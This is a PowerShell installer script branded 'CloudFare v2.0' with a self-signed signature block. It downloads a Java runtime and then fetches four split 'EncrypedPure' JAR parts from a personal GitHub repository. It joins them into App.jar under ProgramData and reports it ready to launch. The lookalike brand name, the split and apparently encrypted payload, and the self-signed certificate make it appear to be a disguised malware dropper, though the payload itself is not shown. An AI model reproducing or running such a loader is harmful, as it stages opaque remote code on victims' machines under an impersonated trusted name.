# CloudFare Installation v2.0
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

$InstallDir = "C:\ProgramData\CloudFare"
$TempDir = "$InstallDir\Temp"
$JavaDir = "$InstallDir\Java"

function Log {
    param([string]$Msg)
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host "[$ts] $Msg" -F Green
}

function Initialize {
    Log "Creating directories..."
    foreach ($dir in $InstallDir, $TempDir, $JavaDir) {
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
    }
    Log "Directories ready"
}

function Download-Java {
    Log "Downloading Java 21..."
    
    $javaZip = "$TempDir\java.zip"
    $url = "https://github.com/graalvm/graalvm-ce-builds/releases/download/jdk-21.0.1/graalvm-community-jdk-21.0.1_windows-x64_bin.zip"
    
    if (Test-Path $javaZip) { Remove-Item $javaZip -Force }
    
    Invoke-WebRequest -Uri $url -OutFile $javaZip -TimeoutSec 300
    $size = (Get-Item $javaZip).Length / 1MB
    Log "Downloaded Java: $([math]::Round($size, 2)) MB"
    
    Log "Extracting Java..."
    Expand-Archive -Path $javaZip -DestinationPath $JavaDir -Force
    Remove-Item $javaZip
    Log "Java installed"
}

function Download-JarParts {
    Log "Downloading JAR parts..."
    
    $parts = @(1, 2, 3, 4)
    
    foreach ($num in $parts) {
        $url = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part$num.jar"
        $file = "$TempDir\EncrypedPure.part$num.jar"
        
        Log "Part $num : Downloading..."
        Invoke-WebRequest -Uri $url -OutFile $file -TimeoutSec 300
        $size = (Get-Item $file).Length / 1MB
        Log "Part $num : Downloaded ($([math]::Round($size, 2)) MB)"
    }
}

function Assemble-Jar {
    Log "Assembling JAR..."
    
    $output = "$InstallDir\App.jar"
    $stream = [System.IO.File]::Create($output)
    
    for ($i = 1; $i -le 4; $i++) {
        $file = "$TempDir\EncrypedPure.part$i.jar"
        $input = [System.IO.File]::OpenRead($file)
        $buffer = New-Object byte[] 1MB
        $read = 0
        
        while (($read = $input.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $stream.Write($buffer, 0, $read)
        }
        $input.Dispose()
        Log "Part $i assembled"
    }
    
    $stream.Dispose()
    $size = (Get-Item $output).Length / 1MB
    Log "JAR complete: $([math]::Round($size, 2)) MB"
}

function Verify {
    Log "Verifying installation..."
    
    $java = "$JavaDir\bin\java.exe"
    $jar = "$InstallDir\App.jar"
    
    if ((Test-Path $java) -and (Test-Path $jar)) {
        Log "Verification OK"
        return $true
    }
    
    Log "Verification FAILED"
    return $false
}

Write-Host ""
Write-Host "CLOUDFARE v2.0 INSTALLATION" -F Cyan
Write-Host ""

Initialize
Download-Java
Download-JarParts
Assemble-Jar

if (Verify) {
    Write-Host ""
    Write-Host "SUCCESS - Ready to launch" -F Green
    Write-Host ""
} else {
    Write-Host ""
    Write-Host "FAILED" -F Red
    Write-Host ""
    exit 1
}

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUfE0+rxjKZA0YgLNXJEgj1kDP
# PIugggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUCSzeSxNDySQuKiTzImQDZJecxawwDQYJ
# KoZIhvcNAQEBBQAEggEAQZYQV27d8LI21BITV8Yjus6wUR0TYp1cSRD0UNbJHLYe
# ouu+eBbXUrquIt5ifJBXKfrpx+Mbj35CW3cTUKfKabIOc5s8Vyo7o7WGdVSbxauI
# ViW7pXTr7cXCknI96Qswl8UBqcti8Z4mp8vScuU/VlIdjzjfUCpgNvxprZGezE2G
# hjXYj+sR9eA7TqABzOS45PLv6V/qzGv89fJClBPjiWC9TEjxcBuU/wKDxRF6SL6h
# gXNOASX+6no11qVE3aUNRfRtZuwvGpoI6ax0yOSKAd5iS8lk1puRGRsB+YyZfNEc
# lhqI75ZY/O9X7YJHrkhwi8rUWMBR5wV1bCTTJoMhOw==
# SIG # End signature block
